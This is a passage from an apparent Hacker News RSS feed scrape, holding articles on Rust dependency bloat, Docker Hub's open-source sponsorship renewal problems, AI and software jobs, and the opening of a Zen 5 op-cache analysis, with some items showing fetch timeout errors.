just so you can get that fix for a bug you don't even have?</p>
<p>It's a plague in most ecosystems with good packaging solutions.
JavaScript and Rust are particularly badly affected by that.  A brand new
Tokio project drags in 28 crates, a new Rocket project balloons that to
172, and a little template engine like MiniJinja can exist with just a
single dependency — while its CLI variant slurps up 142.</p>
<p>If that doesn't sound like a big deal, let's consider <a href="https://crates.io/crates/terminal_size">terminal_size</a>.  It is a crate that does
exactly what its name suggests: it figures out your terminal dimensions.
The underlying APIs it uses have effectively been stable since the earliest days of computing
terminals—what, 50 years or so? And yet, for one function, terminal-size
manages to introduce three or four additional crates, depending on your
operating system.  That triggers a whole chain reaction, so you end up
compiling thousands of other functions just to figure out if your terminal
is 80x25 or 120x40.  That crate had 26 releases.  My own version of that
that I have stuck away in a project from 10 years ago still works without
a single update.  Because shocker: nothing about figuring out terminal
sizes has changed.  <a href="#footnote-1" id="footnote-reference-1">[1]</a></p>
<p>So why does <cite>terminal-size</cite> have so many updates if it's so stable?
Because it's build on top of platform abstraction libraries that
constantly churn, so it needs to update to avoid code duplication and
blowing up compile times even more.</p>
<p>But “big supply chain” will tell you that you must do it this way.  Don't
you dare to copy paste that function into your library.  Or don't you date
to use “unsafe” yourself.  You're not qualified enough to write unsafe
code, let the platform abstraction architects do that.  Otherwise someone
<a href="https://github.com/geiger-rs/cargo-geiger">will slap you</a>.  There are
entire companies who are making a living of supplying you with the tools
needed to deal with your dependency mess.  In the name of security, we're
pushed to having dependencies and keeping them up to date, despite most of
those dependencies being the primary source of security problems.</p>
<p>The goal of code in many ways should be to be written in a way that it
does not need updates.  It should eventually achieve some level of
stability.  In the Rust ecosystem stable code is punished.  If you have a
perfectly working dependency but you have a somewhat inactive bug tracker,
RUSTSEC will come by and <a href="https://lucumr.pocoo.org/2024/3/26/rust-cdo/">give you a chunk rating</a>.</p>
<p>But there <em>is</em> a simpler path.  You write code yourself.  Sure, it's more
work up front, but once it's written, it's done. No new crates, no waiting
for upsteam authors to fix that edge case.  If it's broken for you, you
fix it yourself.  Code that works doesn't necessarily need the
maintenance treadmill.  Your code has a corner case?  Who cares.  This is
that vibe shift we need in the Rust world: celebrating fewer dependencies
rather than more.</p>
<p>We're at a point in the most ecosystems where pulling in libraries is not
just the default action, it's seen positively: “Look how modular and
composable my code is!”  Actually, it might just be a symptom of never
wanting to type out more than a few lines.</p>
<p>Now one will make the argument that it takes so much time to write all of
this.  It's 2025 and it's faster for me to have ChatGPT or Cursor whip up
a dependency free implementation of these common functions, than it is for
me to start figuring out a dependency.  And it makes sense as for many
such small functions the maintenance overhead is tiny and much lower than
actually dealing with constant upgrading of dependencies.  The code is just
a few lines and you also get the benefit of no longer need to compile
thousands of lines of other people's code for a single function.</p>
<p>But let's face it: corporate code review culture which also has infected
Open Source software.  Companies are more likely to reward engineers than
scold them for pulling in that new “shiny library” that solves the problem
they never actually had.  That creates problems, so dependabot and friends
was born.  Today I just dread getting dependabot pull requests but on
projects but I have to accept it.  I'm part of an ecosystem with my stuff
and that ecosystem is all about churn, churn, churn.  In companies you can
also keep entire internal engineering teams busy with vendoring
dependencies, internal audits and upgrading things throughout the company.</p>
<p>Fighting this fight is incredibly hard!  Every new hire has been trained
on the idea that dependencies are great, that code reuse is great.  That
having old code sitting around is a sign of bad engineering culture.</p>
<p>It's also hard to fight this in Open Source.  Years ago I wrote <a href="https://crates.io/crates/sha1_smol">sha1-smol</a> which originally was just called
<cite>sha1</cite>.  It became the standard crate to calculate SHA1 hashes.
Eventually I was pressured to donate that package name to rust-crypto and
to depend on the rest of the crypto ecosystem as it was so established.
If you want to use the new sha1 crate, you get to enjoy 10 dependencies.
But there was just no way around it, because that name in the registry is
precious and people also wanted to have trait compatibility.  It feels
tiring to be the only person in a conversation pushing to keep the churn
down and dependencies low.</p>
<p>It's time to have a new perspective: we should give kudos to engineers who
write a small function themselves instead of hooking in a transitive web
of crates.  We should be suspicious of big crate graphs.  Celebrated are
the minimal dependencies, the humble function that just quietly does the
job, the code that doesn't need to be touched for years because it was
done right once.</p>
<p>And sure, it's not black and white.  There are the important libraries
that solve hard problems.  Graphics libraries that abstract over complex
drivers, implementations of protocols like HTTP and QUIC.  I won't be able
to get rid of tokio and I have no desire to.  But when you end up using
one function, but you compile hundreds, some alarm bell should go off.</p>
<p>We need that vibe shift.  To celebrate building it yourself when it's
appropriate to do so.  To give credit to library authors who build low to
no-dependency Open Source libraries.</p>
<p>For instance minijinja celebrates it in the readme:</p>
<pre>$ cargo tree
minimal v0.1.0 (examples/minimal)
└── minijinja v2.6.0 (minijinja)
    └── serde v1.0.144
</pre>
<p>And it has a PR to eventually <a href="https://github.com/mitsuhiko/minijinja/pull/539">get rid of the last dependency</a>.  And sometime this
year I will make it my goal to go ahead proudly and trim down all that fat
in my projects.</p>
<table id="footnote-1">
<colgroup><col><col></colgroup>
<tbody>
<tr><td><a href="#footnote-reference-1">[1]</a></td><td>Disclaimer: you will need one dependency for UNIX: <cite>libc</cite>.  That's
because Rust does not expose the platform's libc constants to you, and
they are not standarized.  That however is such a common and
lightweight dependency that you won't be able to avoid it anyways.</td></tr>
</tbody>
</table>


  
  <p>This entry was tagged
    
      <a href="https://lucumr.pocoo.org/tags/rust/">rust</a> and 
      <a href="https://lucumr.pocoo.org/tags/thoughts/">thoughts</a>
  

      </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[We Need to Talk About Docker Hub (118 pts)]]></title>
            <link>https://www.linuxserver.io/blog/we-need-to-talk-about-docker-hub</link>
            <guid>42812203</guid>
            <pubDate>Fri, 24 Jan 2025 11:40:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.linuxserver.io/blog/we-need-to-talk-about-docker-hub">https://www.linuxserver.io/blog/we-need-to-talk-about-docker-hub</a>, See on <a href="https://news.ycombinator.com/item?id=42812203">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
        <p><a href="https://hub.docker.com/">Docker Hub</a> is the de facto standard Docker registry, literally, if you don't specify a registry when pulling an image Docker will invisibly prepend <code>docker.io/</code> to it. That bit is fair enough really, it's their software and their registry platform so why not prefer it? From the beginning of the Linuxserver project we used Docker Hub as our primary registry; as we grew we started mirroring our images to Gitlab and Quay.io, more as a backup than anything else, there was no reason for us to have concerns about the stability or functionality of Docker Hub, until...</p>
<p>In 2020 Docker announced that they would start <a href="https://web.archive.org/web/20201101055027/https://www.docker.com/blog/scaling-dockers-business-to-serve-millions-more-developers-storage">purging old images</a> and introducing <a href="https://web.archive.org/web/20201101055027/https://www.docker.com/blog/scaling-docker-to-serve-millions-more-developers-network-egress/">pull limits</a> for unpaid accounts and unauthenticated users - for some reason they've scrubbed these posts from their blog, hence the <a href="https://archive.org/">Internet Archive</a> links.</p>
<p>This concerned us, and many other users, deeply, not just because of the changes - our CI account is on a paid plan so wouldn't have been directly affected - but because of the direction of travel it indicated and the potential impact to our users. Around the same time, Github launched its own container registry, GHCR, which was an evolution of their existing packages registry. This prompted us to consider changing our primary registry and later that year we started updating our documentation to use ghcr.io as the registry for all our examples. In 2021 we partnered with <a href="https://app.scarf.sh/">Scarf</a> to set up <a href="https://www.linuxserver.io/blog/wrap-up-warm-for-the-winter">lscr.io</a> as a frontend registry for all our images, but retained ghcr.io as the backend provider. In 2023, Docker Hub announced that they were <a href="https://www.linuxserver.io/blog/docker-team-changes">sunsetting Free Team Organisations</a>, meaning your options were going to be free individual user accounts, or paid team accounts. While we would have been protected from the changes, Docker ultimately decided not to go forward with them, after user backlash.</p>
<p>In the meantime, we applied for and were granted membership of the <a href="https://www.docker.com/community/open-source/">Docker-Sponsored Open Source (DSOS) program</a>. The application process was messy and slow, but it meant we were no longer subject to the pull limits and image purging of a free account.</p>
<p>Fast-forward to October 2024: we were preparing for our annual DSOS renewal. This process is <em>abysmal</em>, there's no way to apply to roll over membership, or even a renewal process per se, you have to reapply from scratch every year using the same badly-designed form that they hilariously describe as a "new, streamlined application process [that] lets you apply with a single click and provides status updates along the way". The confirmation email notifies you that the application process can take up to a month, so we waited as usual. A month came and went without any update beyond the initial automated reply. In mid-November our DSOS status expired, reverting our account to Free Teams status and removing all the benefits of DSOS membership.</p>
<p>We reached out to Docker via the contact email they provide (opensource@docker.com), although it's worth noting that they do not publish it anywhere related to the DSOS program application process, and did not receive any response, not even a "This mailbox is no longer monitored". Twice more we attempted to reach out to them about the status of our application, but still have yet to receive a response.</p>
<p>We're now 3 months on from our renewal submission, with zero communication from Docker, an account that is no longer part of the DSOS program, and no obvious way to speak to a human about it. We could resubmit the form, but why would that go any differently to last time? There's clearly no point in using the email address as it is seemingly ignored. We do have some contacts who work at Docker but they're engineers, not responsible for Docker Hub's account management, and we don't want to make this their problem. We're going to try logging a regular support ticket but as we're now on a free account we're not hopeful of getting a helpful response.</p>
<p>It's hard to know if we've just fallen through the cracks somehow or if there are more systemic issues going on within the Docker organisation at the moment, but this feels like the kind of process that should have some degree of resilience to it if you're going to offer it to people, and frankly the lack of a straightforward renewal option has always been kind of unacceptable.</p>
<p>All of this has made us seriously reconsider what we do going forwards; we obviously won't pull all our images off Docker Hub, nor is it sensible to just stop pushing new images as it will seriously impact the many users we have who pull from there and don't read these blog posts or generally keep track of what we're up to as an organisation, but it <em>does</em> feel like we need to do something. Whatever we decide, we'll keep you informed.</p>
<p>Side note: If you're reading this and you work for Docker in some relevant capacity, give us a hint as to what we're supposed to do here, we'd really appreciate it.</p>
      </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UI is hell: four-function calculators (201 pts)]]></title>
            <link>https://lcamtuf.substack.com/p/ui-is-hell-four-function-calculators</link>
            <guid>42810300</guid>
            <pubDate>Fri, 24 Jan 2025 03:46:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lcamtuf.substack.com/p/ui-is-hell-four-function-calculators">https://lcamtuf.substack.com/p/ui-is-hell-four-function-calculators</a>, See on <a href="https://news.ycombinator.com/item?id=42810300">Hacker News</a></p>
Couldn't get https://lcamtuf.substack.com/p/ui-is-hell-four-function-calculators: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[The State of Vim (247 pts)]]></title>
            <link>https://lwn.net/Articles/1002342/</link>
            <guid>42810176</guid>
            <pubDate>Fri, 24 Jan 2025 03:22:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lwn.net/Articles/1002342/">https://lwn.net/Articles/1002342/</a>, See on <a href="https://news.ycombinator.com/item?id=42810176">Hacker News</a></p>
Couldn't get https://lwn.net/Articles/1002342/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[AI isn't going to kill the software industry (103 pts)]]></title>
            <link>https://dustinewers.com/ignore-the-grifters/</link>
            <guid>42810175</guid>
            <pubDate>Fri, 24 Jan 2025 03:22:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dustinewers.com/ignore-the-grifters/">https://dustinewers.com/ignore-the-grifters/</a>, See on <a href="https://news.ycombinator.com/item?id=42810175">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I feel like half of my social media feed is composed of AI grifters saying software developers are not going to make it. Combine that sentiment with some economic headwinds and it’s easy to feel like we’re all screwed. I think that’s bullshit. The best days of our industry lie ahead.</p><p>It’s highly unlikely that software developers are going away any time soon. The job is definitely going to change, but I think there are going to be even more opportunities for software developers to make a comfortable living making cool stuff.</p><p>Here’s your white pill. It’s all going to be okay.</p><h2 id="economics">Economics</h2><p>The field of economics has a lot to say about automation, productivity gains, and how they effect the economy. There’s no shortage of people saying “this time it’s different”, but those people have been around for every other major technological advance and they have yet to be correct. I wouldn’t bet on the doomers.</p><h3 id="jevons-paradox">Jevons Paradox</h3><p>AI tools create a significant productivity boost for developers. Different folks report different gains, but most people who try AI code generation recognize its ability to increase velocity. Many people think that means we’re going to need fewer developers, and our industry is going to slowly circle the drain.</p><p>This view is based on a misunderstanding of why people pay for software. A business creates software because they think that it will give them some sort of economic advantage. The investment needs to pay for itself with interest. There are many software projects that would help a business, but businesses aren’t going to do them because the return on investment doesn’t make sense.</p><p>When software development becomes more efficient, the ROI of any given software project increases, which unlocks more projects. That legacy modernization project that no one wants to tackle because it’s super costly. Now you can make AI do most of the work. That project now makes sense. That cool new software product idea that might be awesome but might also crash and burn. AI can make it cheaper for a business to roll the dice. Cheaper software means people are going to want more of it. More software means more jobs for increasingly efficient software developers.</p><p>Economists call this Jevons Paradox.</p><h3 id="comparative-advantage">Comparative Advantage</h3><p>When we think of future AI, we imagine a system that can do everything better than a human being. The all-knowing AI is better at programming, art, diagnosing diseases, and coming up with new ways to make toast. How can any human compete with that?</p><p>Turns out, it doesn’t really matter. There are already lots of situations where people who aren’t the best at something still find work.</p><p>Imagine a small business owner who is absolutely the best at everything in their business. They know every aspect of their business and can do any job in it better than anyone they can hire. Regardless of their genius, they only have 24 hours in a day. If they want to scale, they will need to hire people so they can focus on their most important work. For example, the business owner may be a better bookkeeper than their accountant, but the opportunity cost of not working on other things justifies hiring someone to keep the books.</p><p>This is an example of comparative advantage. Comparative advantage is when a country, company, or person can produce something at a lower opportunity cost than others. Even if that entity is not the most efficient producer, they’ll still be able to sell their product as long as someone else has more important things to do.</p><p>While AI is powerful, it’s also computationally expensive. Unless someone decides to rewrite the laws of physics, there will always be a limit on how much artificial intelligence humanity can bring to bear. This means that we’ll eventually allocate our scarce AI resources towards the things they are best at, which leaves plenty of things for humans to do.</p><h3 id="solow-model-of-growth">Solow Model of Growth</h3><p>The Solow model shows that economic growth is a product of capital (factories, data centers, corporate relationships, land, etc…), labor, and technological progress. In the long run, the only reliable driver of economic growth is technological progress. Our society gets richer by learning new ways to deploy scarce capital.</p><p>Another way to think about this on a micro level is that you can’t sustainably make more money than the economic value you create. A person who digs a hole with a shovel is not going to be able to make as much money as someone driving a bulldozer.</p><p>Widespread adoption of artificial intelligence will greatly accelerate technological progress. This acceleration will create a massive increase in economic growth. This rising tide will create more resources for everyone. If you’ve spent any time following the e/acc community on Twitter, this is what they’re banking on.</p><p>The Solow Model is more of a macro level concept and doesn’t specifically apply to software development as an industry. While I don’t think software development as a career is going away any time soon, if it does, we’ll still probably be better off. It’s better to be a barista in Star Trek than a noble in Game of Thrones.</p><h3 id="widespread-ai">Widespread AI</h3><p>While increased societal wealth is nice, what happens if all of that wealth is controlled by a handful of large companies run by a small cadre of tech elites that hoard all of the AI compute?</p><p>This is unlikely for a lot of reasons, but one of the big reasons is that AI innovators are committed to making AI accessible. While there are plenty of folks that offer access to AI-based tools, you can also DIY your own AI.</p><p>On the model side, many producers of models release them for free. While the top tier Open AI models are locked behind their walled garden, you can fire up Ollama or CivitaI and download lots of very capable models.</p><p>On the hardware side, Nvidia is also pushing local model execution via things like their Jetson Nano products and Digits mini computer. This doesn’t even include things like consumer video cards, or the M4 Mac Mini, which people have been using to make their own AI clusters. AMD is also working hard to make it easy to run local models.</p><p>There’s a huge incentive to make AI resources accessible to most people. If we amplify everyone by making it easy to access their own small army of personal assistants, innovation skyrockets. AI has the potential to enable millions of small creators to build sustainable businesses.</p><h2 id="the-job-of-software-developers">The Job of Software Developers</h2><p>Now that we’ve covered a few macro reasons why we aren’t screwed, let’s look at some more down to earth reasons why we’re still going to need software developers in the age of AI.</p><h3 id="the-70-problem">The 70% Problem</h3><p>AI models are fantastic at producing a wide variety of things. Sometimes the results are good and sometimes they’re weird. AI generated code is no different. I have yet to prompt an AI generated function that’s 100% correct. Gen AI is great for getting started, but it won’t write your whole app for you. This is occasionally referred as the “70% problem”, where AI can get you most of the way there, but it falls down at the end.</p><p>A lot of folks who don’t know how to write software and think they can prompt their way to success will get stuck in a loop where each prompt fixes one issue and causes two more. This is the 70% problem in action. You can generate code all day, but there’s no guarantee it’s going to be the right code.</p><p>Even if you get the AI to generate all of your code for you, it still needs to be tested, monitored, deployed, and maintained. Even if you get AI to write most of your code, there’s still plenty to do.</p><p>AI code gen also tends to fall down in complex enterprise systems. You can crank out cute demo apps all day long, but most systems don’t resemble cute demo apps. This isn’t much different than the Ruby on Rails 15 minute blog app scaffolding demos from back in the day. They looked cool, but it was only the first step.</p><h3 id="much-of-our-job-isnt-writing-code-anyway">Much of our job isn’t writing code anyway</h3><p>The folks who think AI is going to wipe out the software industry don’t fully understand what software engineers do day to day. After 20 years, coding is honestly one of the easiest parts of the job for me. There’s lots of time spent talking with other engineers, understanding the business domain, figuring out the best approach, weighing options, and designing systems. Even if AI generates most of our code, we’ll still need to tell the thing what to write and that’s going to require software developers.</p><h3 id="we-have-so-much-software-left-to-build">We have so much software left to build</h3><p>The biggest assumption of the doomer crowd we’re close to having “enough” software and increased efficiency is going to quickly exhaust the project queue. I have yet to work for a company that doesn’t have a near infinite backlog of things they want to do. If software development moves faster, we’re just going to build more software.</p><h2 id="what-do-i-need-to-do">What do I need to do?</h2><p>Some developers think AI isn’t going to change much of anything and we should just sit tight and wait for it all to blow over. That view is just as short sided as the doomer side of the equation. Software development has always been a career where you are either learning new things or stagnating. AI doesn’t change the need to keep learning and evolving.</p><p>The best thing you can do is learn how the current stack of AI tools work. If you can use Copilot at work, go for it. Otherwise, spin up your free Copilot trial and build something. Beyond that, take some time to learn how AI works and think about other ways it can improve your workflow. Maybe get it to crank out some of that documentation you don’t want to write anyway.</p><p>Beyond that, keep learning about what it takes to build good software. Work on your architecture &amp; design skills. Consider branching out into other areas in the stack like product development. While the value of raw coding skills might go down, the value of everything else around them is going to continue to rise.</p><p>The software developer job is going to change a lot in the next five years. The AI revolution is similar to the introduction of compilers. If you keep up and learn the new paradigms, then you’re going to be okay. Otherwise, you might find yourself in a bad place.</p><p>Things are probably going to get a little weird, but it’s not like you signed up to be a developer because it was the same thing every day. Crack the books, fire up your copilot enhanced editor, and make cool stuff.</p><h4 id="links">Links</h4><p>If you want a longer description of this topic, check out this article from an actual economist:<br><a href="https://www.noahpinion.blog/p/plentiful-high-paying-jobs-in-the">Plentiful, high-paying jobs in the age of AI</a></p><p>A good video series on the Solow Model:<br><a href="https://www.youtube.com/watch?v=eVAS-t83Tx0&amp;list=PL-uRhZ_p-BM6L_I3IHvE85NHooK2Ln9Rm">Intro to the Solow Model of Economic Growth</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Weierstrass's Monster (164 pts)]]></title>
            <link>https://www.quantamagazine.org/the-jagged-monstrous-function-that-broke-calculus-20250123/</link>
            <guid>42810103</guid>
            <pubDate>Fri, 24 Jan 2025 03:02:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.quantamagazine.org/the-jagged-monstrous-function-that-broke-calculus-20250123/">https://www.quantamagazine.org/the-jagged-monstrous-function-that-broke-calculus-20250123/</a>, See on <a href="https://news.ycombinator.com/item?id=42810103">Hacker News</a></p>
Couldn't get https://www.quantamagazine.org/the-jagged-monstrous-function-that-broke-calculus-20250123/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[A QR code that sends you to a different destination - lenticular and adversarial (512 pts)]]></title>
            <link>https://mstdn.social/@isziaui/113874436953157913</link>
            <guid>42809268</guid>
            <pubDate>Thu, 23 Jan 2025 23:55:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mstdn.social/@isziaui/113874436953157913">https://mstdn.social/@isziaui/113874436953157913</a>, See on <a href="https://news.ycombinator.com/item?id=42809268">Hacker News</a></p>
Couldn't get https://mstdn.social/@isziaui/113874436953157913: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Disabling Zen 5's Op Cache and Exploring Its Clustered Decoder (108 pts)]]></title>
            <link>https://chipsandcheese.com/p/disabling-zen-5s-op-cache-and-exploring</link>
            <guid>42809034</guid>
            <pubDate>Thu, 23 Jan 2025 23:14:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://chipsandcheese.com/p/disabling-zen-5s-op-cache-and-exploring">https://chipsandcheese.com/p/disabling-zen-5s-op-cache-and-exploring</a>, See on <a href="https://news.ycombinator.com/item?id=42809034">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>Zen 5 has an interesting frontend setup with a pair of fetch and decode clusters. Each cluster serves one of the core’s two SMT threads. That creates parallels to AMD’s Steamroller architecture from the pre-Zen days. Zen 5 and Steamroller can both decode up to eight instructions per cycle with two threads active, or up to four per cycle for a single thread.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png" width="688" height="385" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/c398644a-9643-4c53-be1c-b86bce682027_688x385.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:385,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc398644a-9643-4c53-be1c-b86bce682027_688x385.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p>Despite these decoder layout similarities, Zen 5’s frontend operates nothing like Steamroller. That’s because Zen 5 mostly feeds itself off a 6K entry op cache, which is often large enough to cover the vast majority of the instruction stream. Steamroller used its decoders for everything, but Zen 5’s decoders are only occasionally activated when there’s an op cache miss. Normally that’d make it hard to evaluate the strength of Zen 5’s decoders, which is a pity because I’m curious about how a clustered decoder could feed a modern high performance core.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png" width="1456" height="384" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:384,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:295314,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F80c67918-c61d-45e1-87f0-a24fc75d424e_2568x677.png 1456w" sizes="100vw"></picture></div></a></figure></div><p>Thankfully, Zen 5’s op cache can be turned off by setting bit 5 in MSR 0xC0011021. Setting that bit forces the decoders to handle everything. Of course, testing with the op cache off is completely irrelevant to Zen 5’s real world performance. And if AMD wanted to completely serve the core using the decoders, there’s a good chance they would have gone with a conventional 8-wide setup like Intel’s Lion Cove or Qualcomm’s Oryon. Still, this is a cool chance to see just how Zen 5 can do with just a 2×4-wide frontend.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F9925e042-364d-45e2-9182-ed7732bb7bd9_2533x1357.png" width="1456" height="780" 